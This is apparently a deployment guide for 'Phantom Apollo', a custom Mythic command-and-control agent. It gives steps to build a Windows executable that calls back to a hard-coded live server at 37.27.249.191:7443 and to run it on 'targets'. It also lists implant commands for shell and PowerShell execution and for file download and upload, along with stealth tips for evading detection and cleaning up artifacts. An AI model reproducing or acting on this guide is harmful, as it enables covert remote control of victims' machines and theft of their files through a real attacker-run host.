# Phantom Apollo Deployment Guide

## Quick Deployment to Mythic Server

### 1. Upload to Mythic Server
Transfer the complete `phantom_apollo` folder to your Mythic server:

```bash
# On your Mythic server
cd /path/to/mythic/Payload_Types/
# Upload the phantom_apollo folder here
```

### 2. Build Container
```bash
cd Payload_Types/phantom_apollo
docker build -t phantom_apollo .
```

### 3. Register Payload
The payload will automatically register when Mythic starts. If already running:
```bash
# Restart Mythic services
./mythic-cli restart
```

### 4. Generate Payloads
1. Access Mythic web interface at `https://37.27.249.191:7443`
2. Navigate to Payload Generation
3. Select "phantom_apollo" 
4. Configure build parameters:
   - **Callback Host**: 37.27.249.191 (pre-configured)
   - **Callback Port**: 7443 (pre-configured)
   - **SSL**: Enabled (recommended)
   - **Callback Interval**: 10 seconds
   - **Debug Mode**: Enable for testing

5. Click "Generate Payload"
6. Download the compiled .exe file

### 5. Deploy to Targets
Execute the generated .exe on Windows targets. The agent will:
- Auto-connect to your Mythic server
- Register with GraphQL authentication
- Begin command polling immediately

## Available Commands

| Command | Usage | Description |
|---------|-------|-------------|
| `ls` | `ls {"path": "C:\\"}` | List directory contents |
| `cd` | `cd {"path": "C:\\Windows"}` | Change directory |
| `pwd` | `pwd` | Show current directory |
| `ps` | `ps` | List running processes |
| `whoami` | `whoami` | Show current user |
| `hostname` | `hostname` | Show system hostname |
| `shell` | `shell {"command": "dir"}` | Execute cmd command |
| `powershell` | `powershell {"command": "Get-Process"}` | Execute PowerShell |
| `download` | `download {"path": "C:\\file.txt"}` | Download file |
| `upload` | `upload {"file": "base64data", "remote_path": "C:\\uploaded.txt"}` | Upload file |
| `sleep` | `sleep {"seconds": "30"}` | Change callback interval |
| `exit` | `exit` | Terminate agent |

## Operational Security

### Stealth Features
- Console window automatically hidden on execution
- Configurable callback intervals with jitter
- Custom user agent strings
- TLS encryption for all communications

### Best Practices
- Use appropriate callback intervals for environment
- Enable jitter to avoid pattern detection
- Monitor for defensive responses
- Clean up artifacts after operations

## Troubleshooting

### Build Issues
- Ensure Go 1.21+ is installed in container
- Verify all template variables are properly replaced
- Check Docker build logs for specific errors

### Connection Problems
- Confirm Mythic server accessibility at 37.27.249.191:7443
- Verify TLS certificates are properly configured
- Check firewall rules allow HTTPS traffic
- Review GraphQL endpoint availability

### Command Execution
- Verify target system permissions for specific commands
- Check PowerShell execution policy for powershell commands
- Ensure file paths exist for download operations
- Validate base64 encoding for upload operations

## Advanced Configuration

### Custom Build Parameters
Modify build parameters in the Mythic interface:
- Callback intervals: Adjust for environment stealth requirements
- User agents: Use environment-appropriate browser strings
- Encryption keys: Set custom PSK for additional security

### Payload Variants
The build system automatically detects architecture:
- 64-bit Windows: `phantom_apollo_amd64.exe`
- 32-bit Windows: `phantom_apollo_386.exe`

## Server Status
- **Mythic Server**: https://37.27.249.191:7443
- **Status**: Operational
- **Authentication**: GraphQL with JWT tokens
- **Compatibility**: Mythic 3.x framework